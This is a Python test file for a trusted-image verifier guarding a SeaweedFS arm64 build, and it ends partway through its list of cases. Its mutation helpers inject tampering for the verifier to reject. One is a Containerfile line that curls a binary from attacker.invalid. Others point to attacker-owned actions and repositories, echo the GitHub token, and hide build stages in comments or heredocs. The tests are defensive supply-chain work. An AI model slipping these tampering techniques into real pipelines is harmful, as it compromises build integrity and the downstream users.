from __future__ import annotations

import ast
import base64
import hashlib
import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Callable
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import verify_trusted_image as verifier  # noqa: E402


STATIC_PATHS = (
    Path(".github/workflows/seaweedfs-arm64.yml"),
    Path("bootstrap/seaweedfs/v4.39/Containerfile"),
    Path("bootstrap/seaweedfs/v4.39/admission.json"),
    Path("bootstrap/seaweedfs/v4.39/go-module-inputs.json"),
    Path("bootstrap/seaweedfs/v4.39/go-vendor.tar.xz"),
    Path("bootstrap/seaweedfs/v4.39/source.json"),
    Path("bootstrap/seaweedfs/v4.39/trusted-build-contract.json"),
    Path("bootstrap/seaweedfs/v4.39/evidence/README.md"),
)


class TrustedImageContractTests(unittest.TestCase):
    @staticmethod
    def _attestation_bundle(
        contract: dict[str, object],
        statement: dict[str, object],
    ) -> dict[str, object]:
        return {
            "mediaType": contract["toolchain"]["cosign"]["bundle_media_type"],  # type: ignore[index]
            "dsseEnvelope": {
                "payload": base64.b64encode(
                    json.dumps(statement, separators=(",", ":")).encode("utf-8")
                ).decode("ascii"),
                "signatures": [
                    {
                        "keyid": "",
                        "sig": base64.b64encode(b"test-signature").decode("ascii"),
                    }
                ],
            },
            "verificationMaterial": {
                "certificate": {
                    "rawBytes": base64.b64encode(b"test-certificate").decode(
                        "ascii"
                    )
                },
                "tlogEntries": [{}],
            },
        }

    def _copy_static_tree(self, destination: Path) -> None:
        for relative in STATIC_PATHS:
            target = destination / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            if relative.name == "go-vendor.tar.xz":
                try:
                    os.link(ROOT / relative, target)
                except OSError:
                    shutil.copy2(ROOT / relative, target)
            else:
                shutil.copy2(ROOT / relative, target)

    def _write_pending_admission(self, root: Path) -> None:
        approved = json.loads(
            (root / verifier.ADMISSION_PATH).read_text(encoding="utf-8")
        )
        contract_path = root / verifier.CONTRACT_PATH
        contract = json.loads(contract_path.read_text(encoding="utf-8"))
        source_path = root / verifier.SOURCE_PATH
        pending = {
            "schema_version": 3,
            "component": contract["component"],
            "version": contract["version"],
            "platform": contract["platform"],
            "upstream_candidate": approved["upstream_candidate"],
            "upstream_assessment": approved["upstream_assessment"],
            "lifecycle": {
                "phase": contract["admission"]["pending_state"],
                "publisher_ref": contract["admission"]["publisher_ref"],
                "workflow": contract["workflow"]["path"],
                "workflow_sha256": contract["workflow"]["sha256"],
                "contract": verifier.CONTRACT_PATH.as_posix(),
                "contract_sha256": hashlib.sha256(
                    contract_path.read_bytes()
                ).hexdigest(),
                "source": verifier.SOURCE_PATH.as_posix(),
                "source_sha256": hashlib.sha256(
                    source_path.read_bytes()
                ).hexdigest(),
                "transition": contract["admission"]["evidence_transition"],
            },
            "bootstrap_observation": {
                "run": (
                    "https://github.com/TommyKammy/Shirokuma/actions/runs/"
                    "29379475587/attempts/1"
                ),
                "source_sha": "1ed307a3cc57bd92a99fb6ce7c64ddcacd932c49",
                "digest": (
                    "sha256:"
                    "027be5ea9a172bbe2c29adb8928061b89ceb2a11261f5248a77653070b106d6d"
                ),
                "artifact": "seaweedfs-4.39-arm64-29379475587-1",
                "attestation": (
                    "https://github.com/TommyKammy/Shirokuma/attestations/35365038"
                ),
                "disposition": "not_admitted_branch_publication",
            },
            "assessment": {
                "assessed_on": "2026-07-15",
                "scope": "mac-studio-solo/local-lab",
                "admission": contract["admission"]["pending_state"],
                "exception_eligible": False,
                "blockers": [
                    {
                        "control": "main_branch_publication",
                        "status": "pending",
                        "evidence": "Only a reviewed main publication may approve.",
                    }
                ],
                "rationale": "Main publication evidence is not yet admitted.",
            },
            "runtime_manifests": {
                "permitted": False,
                "blockers": [
                    {
                        "control": "main_branch_release_evidence",
                        "status": "pending",
                        "evidence": "No main release evidence is admitted.",
                    },
                    {
                        "control": "resident_evidence_contract",
                        "status": "pending",
                        "evidence": "Parent Issue #26 remains incomplete.",
                    },
                ],
                "paths": [
                    "deploy/gitops/object-storage/kustomization.yaml",
                    "deploy/gitops/clusters/local-lite/object-storage.yaml",
                ],
            },
            "next_action": {
                "mode": "publish-from-main-then-evidence-pr",
                "decision_record_required": False,
                "requirements": [
                    "publish from main",
                    "retain complete evidence",
                    "review the evidence-only transition",
                    "keep runtime blocked until parent completion",
                ],
            },
        }
        (root / verifier.ADMISSION_PATH).write_text(
            json.dumps(pending), encoding="utf-8"
        )

    def _assert_mutation_fails(
        self,
        mutate: Callable[[Path], None],
        expected_code: str,
    ) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self._copy_static_tree(root)
            mutate(root)
            with self.assertRaises(verifier.ContractError) as caught:
                verifier.validate_static_contract(root)
            self.assertEqual(caught.exception.code, expected_code)

    def test_repository_static_contract_is_closed_and_valid(self) -> None:
        contract = verifier.validate_static_contract(ROOT)
        self.assertEqual(
            set(contract["toolchain"]),
            {"buildx", "buildkit", "syft", "trivy", "cosign", "crane"},
        )
        workflow = (ROOT / contract["workflow"]["path"]).read_text(encoding="utf-8")
        self.assertIn("needs: verify", workflow)
        self.assertNotIn("imjasonh/setup-crane@", workflow)
        self.assertNotIn("docker/setup-buildx-action@", workflow)
        self.assertEqual(
            contract["toolchain"]["cosign"]["attestation_predicates"],
            {
                "sbom": {
                    "artifact": "sbom-attestation-bundle.json",
                    "cli_type": "cyclonedx",
                    "predicate_type": "https://cyclonedx.org/bom",
                },
                "vulnerability_scan": {
                    "artifact": "trivy-attestation-bundle.json",
                    "cli_type": "https://shirokuma.dev/attestations/trivy/v1",
                    "predicate_type": "https://shirokuma.dev/attestations/trivy/v1",
                },
            },
        )
        self.assertIn(
            "sbom-attestation-bundle.json",
            contract["evidence"]["candidate_required"],
        )
        self.assertIn(
            "trivy-attestation-bundle.json",
            contract["evidence"]["candidate_required"],
        )

    def test_literal_contract_paths_exist_in_the_reviewed_schema(self) -> None:
        tree = ast.parse(
            (ROOT / "scripts/verify_trusted_image.py").read_text(encoding="utf-8")
        )
        contract = verifier.load_contract(ROOT)

        def literal_path(node: ast.AST) -> tuple[str, ...] | None:
            keys: list[str] = []
            current = node
            while isinstance(current, ast.Subscript):
                if not (
                    isinstance(current.slice, ast.Constant)
                    and isinstance(current.slice.value, str)
                ):
                    return None
                keys.append(current.slice.value)
                current = current.value
            if not isinstance(current, ast.Name) or current.id != "contract":
                return None
            return tuple(reversed(keys))

        paths = {
            path
            for node in ast.walk(tree)
            if (path := literal_path(node)) is not None
        }
        self.assertTrue(paths)
        for path in sorted(paths):
            value: object = contract
            for key in path:
                self.assertIsInstance(value, dict, msg=".".join(path))
                self.assertIn(key, value, msg=".".join(path))
                value = value[key]  # type: ignore[index]

    def test_pending_repository_audit_is_explicit_and_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self._copy_static_tree(root)
            self._write_pending_admission(root)
            with mock.patch.object(
                verifier.shutil,
                "which",
                side_effect=AssertionError("pending audit must not look up Cosign"),
            ):
                admission = verifier.validate_repository_audit(root)
            self.assertEqual(
                admission["assessment"]["admission"], "pending_main_publication"
            )
            with self.assertRaises(verifier.ContractError) as caught:
                verifier.validate_release_bundle(root, require_promotion=True)
            self.assertEqual(caught.exception.code, "EVIDENCE_MISSING")

            path = root / verifier.ADMISSION_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            data["bootstrap_observation"]["disposition"] = "approved"
            path.write_text(json.dumps(data), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier.validate_repository_audit(root)
            self.assertEqual(caught.exception.code, "BOOTSTRAP_OBSERVATION")

    def test_pending_repository_audit_extracts_the_retained_vendor_bundle(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self._copy_static_tree(root)
            self._write_pending_admission(root)
            with mock.patch.object(
                verifier.package_go_vendor,
                "verify_package",
            ) as verify:
                verifier.validate_repository_audit(root)
            verify.assert_called_once()
            self.assertIs(
                verify.call_args.kwargs["verify_archive_contents"],
                True,
            )

    def test_approved_repository_audit_routes_to_release_verification(
        self,
    ) -> None:
        with mock.patch.object(
            verifier,
            "validate_release_bundle",
            return_value={"admission_status": "approved"},
        ) as validate:
            release = verifier.validate_repository_audit(ROOT)
        validate.assert_called_once_with(ROOT.resolve(), require_promotion=True)
        self.assertEqual(release["admission_status"], "approved")

    def test_contract_mutations_fail_with_stable_error_codes(self) -> None:
        def rebind_workflow_and_contract(root: Path) -> None:
            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            contract_path = root / verifier.CONTRACT_PATH
            contract = json.loads(contract_path.read_text(encoding="utf-8"))
            contract["workflow"]["sha256"] = hashlib.sha256(
                workflow_path.read_bytes()
            ).hexdigest()
            contract_path.write_text(json.dumps(contract), encoding="utf-8")

            admission_path = root / verifier.ADMISSION_PATH
            admission = json.loads(admission_path.read_text(encoding="utf-8"))
            if "lifecycle" in admission:
                admission["lifecycle"]["workflow_sha256"] = contract["workflow"][
                    "sha256"
                ]
                admission["lifecycle"]["contract_sha256"] = hashlib.sha256(
                    contract_path.read_bytes()
                ).hexdigest()
            admission_path.write_text(json.dumps(admission), encoding="utf-8")

        def replace_and_rehash_containerfile(
            root: Path,
            old: str,
            new: str,
        ) -> None:
            container_path = root / "bootstrap/seaweedfs/v4.39/Containerfile"
            container = container_path.read_text(encoding="utf-8")
            self.assertIn(old, container)
            container = container.replace(old, new, 1)
            container_path.write_text(container, encoding="utf-8")
            container_hash = hashlib.sha256(container.encode("utf-8")).hexdigest()
            source_path = root / verifier.SOURCE_PATH
            source = json.loads(source_path.read_text(encoding="utf-8"))
            source["containerfile_sha256"] = container_hash
            source_path.write_text(json.dumps(source), encoding="utf-8")
            contract_path = root / verifier.CONTRACT_PATH
            contract = json.loads(contract_path.read_text(encoding="utf-8"))
            contract["source"]["containerfile"]["sha256"] = container_hash
            contract_path.write_text(json.dumps(contract), encoding="utf-8")

        def remove_buildkit(root: Path) -> None:
            path = root / verifier.CONTRACT_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            del data["toolchain"]["buildkit"]
            path.write_text(json.dumps(data), encoding="utf-8")

        def switch_rekor_api_without_migration(root: Path) -> None:
            path = root / verifier.CONTRACT_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            data["transparency_log"]["major_api_version"] = 2
            path.write_text(json.dumps(data), encoding="utf-8")

        def alter_containerfile(root: Path) -> None:
            path = root / "bootstrap/seaweedfs/v4.39/Containerfile"
            path.write_text(path.read_text(encoding="utf-8") + "\n# drift\n", encoding="utf-8")

        def redirect_source_build_input(root: Path) -> None:
            path = root / verifier.SOURCE_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            data["build_inputs"]["go"] = (
                "docker.io/library/golang@sha256:" + "a" * 64
            )
            path.write_text(json.dumps(data), encoding="utf-8")

        def hide_changed_frontend_behind_comment(root: Path) -> None:
            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
            reviewed = source["build_inputs"]["dockerfile_frontend"]
            replacement = "docker/dockerfile:1.7.1@sha256:" + "a" * 64
            replace_and_rehash_containerfile(
                root,
                f"# syntax={reviewed}",
                f"# syntax={replacement}\n# retained text is not an instruction: {reviewed}",
            )

        def add_unreviewed_escape_directive(root: Path) -> None:
            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
            reviewed = source["build_inputs"]["dockerfile_frontend"]
            replace_and_rehash_containerfile(
                root,
                f"# syntax={reviewed}\n",
                f"# syntax={reviewed}\n# escape=`\n",
            )

        def hide_changed_go_arg_behind_comment(root: Path) -> None:
            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
            reviewed = source["build_inputs"]["go"]
            replacement = "golang:1.25.12-alpine@sha256:" + "a" * 64
            replace_and_rehash_containerfile(
                root,
                f"ARG GO_IMAGE={reviewed}",
                f"ARG GO_IMAGE={replacement}\n# retained text is not an ARG: {reviewed}",
            )

        def bypass_go_arg_in_builder_stage(root: Path) -> None:
            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
            reviewed = source["build_inputs"]["go"]
            replacement = "golang:1.25.12-alpine@sha256:" + "b" * 64
            replace_and_rehash_containerfile(
                root,
                "FROM --platform=$BUILDPLATFORM ${GO_IMAGE} AS builder",
                (
                    f"FROM --platform=$BUILDPLATFORM {replacement} AS builder\n"
                    "# retained text is not a stage: "
                    "FROM --platform=$BUILDPLATFORM ${GO_IMAGE} AS builder\n"
                    f"# reviewed ARG text alone is insufficient: {reviewed}"
                ),
            )

        def hide_scratch_stage_in_continuation(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "FROM scratch",
                "RUN echo decoy \\\nFROM scratch",
            )

        def split_hidden_from_keyword(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "FROM scratch\n",
                (
                    "FROM scratch\n"
                    "FRO\\\n"
                    "M alpine:3.23.3 AS hidden-final\n"
                ),
            )

        def hide_certificates_stage_in_heredoc(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "FROM ${RUNTIME_IMAGE} AS certificates",
                "RUN <<EOF\nFROM ${RUNTIME_IMAGE} AS certificates\nEOF",
            )

        def split_hidden_heredoc_opener(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "FROM ${RUNTIME_IMAGE} AS certificates",
                "RUN <\\\n<EOF\nFROM ${RUNTIME_IMAGE} AS certificates\nEOF",
            )

        def add_networked_builder_replacement(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "\n\nFROM ${RUNTIME_IMAGE} AS certificates",
                (
                    "\nRUN --network=default curl https://attacker.invalid/weed "
                    "-o /out/weed\n\nFROM ${RUNTIME_IMAGE} AS certificates"
                ),
            )

        def quote_checksum_pipe_as_data(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                "      | sha256sum -c - && \\\n",
                "      '|' sha256sum -c - && \\\n",
            )

        def suppress_source_commit_expansion(root: Path) -> None:
            replace_and_rehash_containerfile(
                root,
                (
                    '      -ldflags="-s -w -extldflags -static -X '
                    "github.com/seaweedfs/seaweedfs/weed/util/version.COMMIT="
                    '${SOURCE_COMMIT}" \\\n'
                ),
                (
                    "      -ldflags='-s -w -extldflags -static -X "
                    "github.com/seaweedfs/seaweedfs/weed/util/version.COMMIT="
                    "${SOURCE_COMMIT}' \\\n"
                ),
            )

        def alter_module_bundle_hash(root: Path) -> None:
            for relative in (verifier.SOURCE_PATH, verifier.CONTRACT_PATH):
                path = root / relative
                data = json.loads(path.read_text(encoding="utf-8"))
                if relative == verifier.SOURCE_PATH:
                    data["module_inputs"]["bundle_sha256"] = "0" * 64
                else:
                    data["source"]["module_inputs"]["bundle_sha256"] = "0" * 64
                path.write_text(json.dumps(data), encoding="utf-8")

        def permit_networked_module_build(root: Path) -> None:
            container_path = root / "bootstrap/seaweedfs/v4.39/Containerfile"
            container = container_path.read_text(encoding="utf-8").replace(
                "      GOPROXY=off \\\n",
                "      GOPROXY=https://proxy.golang.org \\\n",
                1,
            )
            container_path.write_text(container, encoding="utf-8")
            container_hash = hashlib.sha256(container.encode("utf-8")).hexdigest()
            source_path = root / verifier.SOURCE_PATH
            source = json.loads(source_path.read_text(encoding="utf-8"))
            source["containerfile_sha256"] = container_hash
            source_path.write_text(json.dumps(source), encoding="utf-8")
            contract_path = root / verifier.CONTRACT_PATH
            contract = json.loads(contract_path.read_text(encoding="utf-8"))
            contract["source"]["containerfile"]["sha256"] = container_hash
            contract_path.write_text(json.dumps(contract), encoding="utf-8")

        def permit_legacy_cosign_records(root: Path) -> None:
            path = root / verifier.CONTRACT_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            data["toolchain"]["cosign"][
                "legacy_signature_records_permitted"
            ] = True
            path.write_text(json.dumps(data), encoding="utf-8")

        def unpin_action(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8")
            workflow = workflow.replace(
                "actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10",
                "actions/checkout@v6",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def add_anonymous_unpinned_action(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "    steps:\n",
                "    steps:\n      - uses: attacker/action@main\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def add_unnamed_run_step_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "    steps:\n",
                "    steps:\n      - run: echo unreviewed-command\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def add_bare_unnamed_run_step_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "    steps:\n",
                "    steps:\n      -\n        run: echo unreviewed-command\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def add_noncanonical_unnamed_job_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "jobs:\n",
                "jobs:\n"
                "  unreviewed:\n"
                "    runs-on: ubuntu-24.04-arm\n"
                "    steps:\n"
                "        - run: echo unreviewed-command\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def add_explicit_key_unnamed_job_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "jobs:\n",
                "jobs:\n"
                "  unreviewed:\n"
                "    runs-on: ubuntu-24.04-arm\n"
                "    ? steps\n"
                "    :\n"
                "      - run: echo unreviewed-command\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def add_flow_style_unnamed_job_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "jobs:\n",
                "jobs:\n"
                "  unreviewed: {runs-on: ubuntu-24.04-arm, "
                "steps: [{run: echo unreviewed-command}]}\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def weaken_trivy_policy_and_rebind(root: Path) -> None:
            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = workflow_path.read_text(encoding="utf-8").replace(
                "          severity: HIGH,CRITICAL\n",
                "          severity: CRITICAL\n",
                1,
            )
            workflow_path.write_text(workflow, encoding="utf-8")
            contract_path = root / verifier.CONTRACT_PATH
            contract = json.loads(contract_path.read_text(encoding="utf-8"))
            contract["workflow"]["trivy_action_inputs"]["severity"] = "CRITICAL"
            contract_path.write_text(json.dumps(contract), encoding="utf-8")
            rebind_workflow_and_contract(root)

        def drift_source_pin_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "  SOURCE_COMMIT: db42bb49757b459551607939807017d7a9d5a94a",
                f"  SOURCE_COMMIT: {'f' * 40}",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def drift_source_checkout_and_rebind(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "          repository: seaweedfs/seaweedfs",
                "          repository: attacker/seaweedfs",
                1,
            )
            path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def inject_dynamic_source_repository_and_rebind(root: Path) -> None:
            source_path = root / verifier.SOURCE_PATH
            source = json.loads(source_path.read_text(encoding="utf-8"))
            source["repository"] = (
                "https://github.com/seaweedfs/${{ github.repository_owner }}"
            )
            source_path.write_text(json.dumps(source), encoding="utf-8")

            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = workflow_path.read_text(encoding="utf-8").replace(
                "          repository: seaweedfs/seaweedfs\n",
                "          repository: seaweedfs/${{ github.repository_owner }}\n",
                1,
            )
            workflow_path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

            admission_path = root / verifier.ADMISSION_PATH
            admission = json.loads(admission_path.read_text(encoding="utf-8"))
            if "lifecycle" in admission:
                admission["lifecycle"]["source_sha256"] = hashlib.sha256(
                    source_path.read_bytes()
                ).hexdigest()
            admission_path.write_text(json.dumps(admission), encoding="utf-8")

        def shadow_source_commit_with_flow_env_and_rebind(root: Path) -> None:
            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
            original = source["commit"]
            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = workflow_path.read_text(encoding="utf-8").replace(
                "  verify:\n",
                f"  verify:\n    env: {{SOURCE_COMMIT: {'f' * 40}}}\n",
                1,
            ).replace(
                "      - name: Fail closed unless immutable source evidence matches\n",
                "      - name: Fail closed unless immutable source evidence matches\n"
                f"        env: {{SOURCE_COMMIT: {original}}}\n",
                1,
            )
            workflow_path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def shadow_source_commit_with_quoted_env_key_and_rebind(root: Path) -> None:
            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = workflow_path.read_text(encoding="utf-8").replace(
                "  verify:\n",
                "  verify:\n"
                "    env:\n"
                f"      \"SOURCE_COMMIT\": {'f' * 40}\n",
                1,
            )
            workflow_path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def shadow_source_commit_with_explicit_env_key_and_rebind(root: Path) -> None:
            workflow_path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = workflow_path.read_text(encoding="utf-8").replace(
                "  verify:\n",
                "  verify:\n"
                "    env:\n"
                "      ? SOURCE_COMMIT\n"
                f"      : {'f' * 40}\n",
                1,
            )
            workflow_path.write_text(workflow, encoding="utf-8")
            rebind_workflow_and_contract(root)

        def add_unapproved_pinned_action(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "    steps:\n",
                f"    steps:\n      - uses: attacker/action@{'a' * 40}\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def expose_credentials_before_buildx_verification(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "          actual_commit=$(git -C seaweedfs-src rev-parse HEAD)",
                "          docker login ghcr.io\n"
                "          actual_commit=$(git -C seaweedfs-src rev-parse HEAD)",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def hide_early_credentials_after_login_comment(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            marker = "      - name: Log in to GHCR for the quarantine push\n"
            workflow = path.read_text(encoding="utf-8")
            self.assertIn(marker, workflow)
            workflow = workflow.replace(
                marker,
                "      # - name: Log in to GHCR for the quarantine push\n"
                "          echo '${{ secrets.GITHUB_TOKEN }}' >/dev/null\n"
                + marker,
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def change_final_retention(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8")
            prefix, marker, suffix = workflow.rpartition("retention-days: 90")
            self.assertTrue(marker)
            path.write_text(prefix + "retention-days: 1" + suffix, encoding="utf-8")

        def redirect_image_repository(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "  IMAGE: ghcr.io/tommykammy/shirokuma-seaweedfs",
                "  IMAGE: ghcr.io/attacker/seaweedfs",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def restore_mutable_gha_cache(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "          no-cache: true\n",
                "          no-cache: true\n"
                "          cache-from: type=gha,scope=seaweedfs-4.39-arm64\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def override_reviewed_go_image(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
                "            GO_IMAGE=golang:latest\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def override_reviewed_go_image_after_blank(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
                "\n"
                "            GO_IMAGE=golang:latest\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def redirect_reviewed_containerfile(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "          file: bootstrap/seaweedfs/v4.39/Containerfile",
                "          file: attacker/Containerfile",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def continue_context_plain_scalar(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "          context: seaweedfs-src\n",
                "          context: seaweedfs-src\n"
                "            attacker-context\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def truncate_build_step_with_comment_decoy(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
                "          # - name: Verify the published platform\n"
                "          context: attacker-context\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def permit_issue_branch_publication(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "      - main\n",
                "      - codex/issue-41\n      - main\n",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def remove_promotion_dependency(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "    needs: verify\n",
                "",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def detach_buildx_from_docker_plugin_discovery(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                'plugin_dir="${DOCKER_CONFIG}/cli-plugins"',
                'plugin_dir="${RUNNER_TEMP}/docker-cli-plugins"',
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def conflate_workflow_and_source_sha(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                '--signer-digest "${GITHUB_WORKFLOW_SHA}"',
                '--signer-digest "${GITHUB_SHA}"',
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def remove_run_attempt_from_candidate_artifact(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "seaweedfs-4.39-arm64-candidate-${{ github.run_id }}-${{ github.run_attempt }}",
                "seaweedfs-4.39-arm64-candidate-${{ github.run_id }}",
            )
            path.write_text(workflow, encoding="utf-8")

        def derive_candidate_from_promotion_attempt(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                'builder_run_attempt = str(release["builder"]["run_attempt"])',
                'builder_run_attempt = os.environ["GITHUB_RUN_ATTEMPT"]',
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def move_promotion_preflight_after_tag(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8").replace(
                "python3 scripts/verify_trusted_image.py promotion-preflight",
                "python3 scripts/verify_trusted_image.py candidate",
                1,
            )
            workflow = workflow.replace(
                '          "${CRANE_BIN}" tag',
                "          python3 scripts/verify_trusted_image.py promotion-preflight\n"
                '          "${CRANE_BIN}" tag',
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        def permit_runtime(root: Path) -> None:
            path = root / verifier.ADMISSION_PATH
            data = json.loads(path.read_text(encoding="utf-8"))
            data["runtime_manifests"]["permitted"] = True
            path.write_text(json.dumps(data), encoding="utf-8")

        def inject_command_into_approved_run_step(root: Path) -> None:
            path = root / ".github/workflows/seaweedfs-arm64.yml"
            workflow = path.read_text(encoding="utf-8")
            marker = "          set -euo pipefail"
            self.assertIn(marker, workflow)
            workflow = workflow.replace(
                marker,
                marker + "\n          echo attacker-controlled-command",
                1,
            )
            path.write_text(workflow, encoding="utf-8")

        cases = (
            (remove_buildkit, "TOOLCHAIN_CLOSED_WORLD"),
            (switch_rekor_api_without_migration, "REKOR_API_CONTRACT"),
            (alter_containerfile, "CONTAINERFILE_HASH"),
            (redirect_source_build_input, "CONTAINERFILE_GLOBAL_ARGS"),
            (hide_changed_frontend_behind_comment, "CONTAINERFILE_SYNTAX_DIRECTIVE"),
            (add_unreviewed_escape_directive, "CONTAINERFILE_SYNTAX_DIRECTIVE"),
            (hide_changed_go_arg_behind_comment, "CONTAINERFILE_GLOBAL_ARGS"),
            (bypass_go_arg_in_builder_stage, "CONTAINERFILE_STAGE_PLAN"),
